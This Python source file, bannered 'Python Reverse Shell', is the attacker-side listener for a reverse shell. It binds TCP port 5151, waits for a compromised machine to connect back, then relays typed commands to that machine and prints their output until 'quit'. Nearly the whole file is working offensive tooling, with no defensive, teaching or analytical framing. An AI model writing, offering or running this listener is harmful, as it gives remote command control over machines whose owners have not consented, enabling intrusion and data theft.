import socket, os, sys

connected = True
title = r"""
________        ___________
___  __ \____  ___  /___  /______________
__  /_/ /_  / / /  __/_  __ \  __ \_  __ \
_  ____/_  /_/ // /_ _  / / / /_/ /  / / /
/_/     _\__, / \__/ /_/ /_/\____//_/ /_/
        /____/
________
___  __ \_______   _________________________
__  /_/ /  _ \_ | / /  _ \_  ___/_  ___/  _ \
_  _, _//  __/_ |/ //  __/  /   _(__  )/  __/
/_/ |_| \___/_____/ \___//_/    /____/ \___/

_____________      ___________
__  ___/__  /_________  /__  /
_____ \__  __ \  _ \_  /__  /
____/ /_  / / /  __/  / _  /
/____/ /_/ /_/\___//_/  /_/

"""

print(title)

def socketCreate():
    try:
        global host
        global port
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = ''
        port = 5151 #input("Port to listen on: ")
        if port == '':
            socketCreate()
        port = int(port)
    except Exception as e:
        print(e, "line 38")

def socketBind():
    try:
        print("Binding socket at port", port)
        s.bind((host, port))
        s.listen(1)
    except Exception as e:
        print(e, "line 46")
        print("Retrying...")
        socketBind()

def socketAccept():
    global conn
    global addr
    global hostname

    try:
        conn, addr = s.accept()
        connected = True
        print("[!] Session opened at %s:%s" %(addr[0], addr[1]))
        print("")
        start = conn.recv(1024).decode()
        print(start, end = "")
        menu()
    except Exception as e:
        connected = False

def menu():
    while 1:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        try:
            command = conn.send(cmd.encode())
        except:
            connected = False
            break
        result = conn.recv(16834)
        result = result.decode()
        print(result, end = "")

socketCreate()
socketBind()

while 1:
    socketAccept()
    print("\n[!] Disconnected, trying to reconnect...")
    s.listen(1)
